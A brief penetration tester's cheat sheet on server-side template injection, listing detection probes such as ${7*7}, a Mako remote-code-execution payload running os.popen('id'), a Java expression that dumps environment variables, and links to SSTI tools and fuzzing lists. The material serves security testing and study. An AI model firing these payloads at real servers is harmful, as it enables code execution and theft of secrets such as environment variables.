# Template Injection

```bash
${7*7}
#{7*7}
*{7*7}
${7*7}
~{7*7}
@{7*7}

```

- Python command injection automation tool [commix](https://github.com/commixproject/commix/)
	- SSTI automation PERFECT tool [Fenjing](https://github.com/Marven11/Fenjing/)
###### notes:
- characters to find possible template injection `${{<%[%'"}}%\`
- use operator `*` instead of `+` because it might be treated as normal text and give false negative
- simple methodology to detect template engine 
![[Template-Injection-Technique.png]]
- rce in Mako template
```python
<% import os x=os.popen('id').read() %> ${x}
```
- extract all variables in java-based template
```java
${T(java.lang.System).getenv()}
```
- if no rce possible,try exploiting methods to perform arbitrary actions
- guide for [template injection](https://www.cobalt.io/blog/a-pentesters-guide-to-server-side-template-injection-ssti) techniques
- fuzzing list [PayloadAllTheThings](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/template-engines-expression.txt)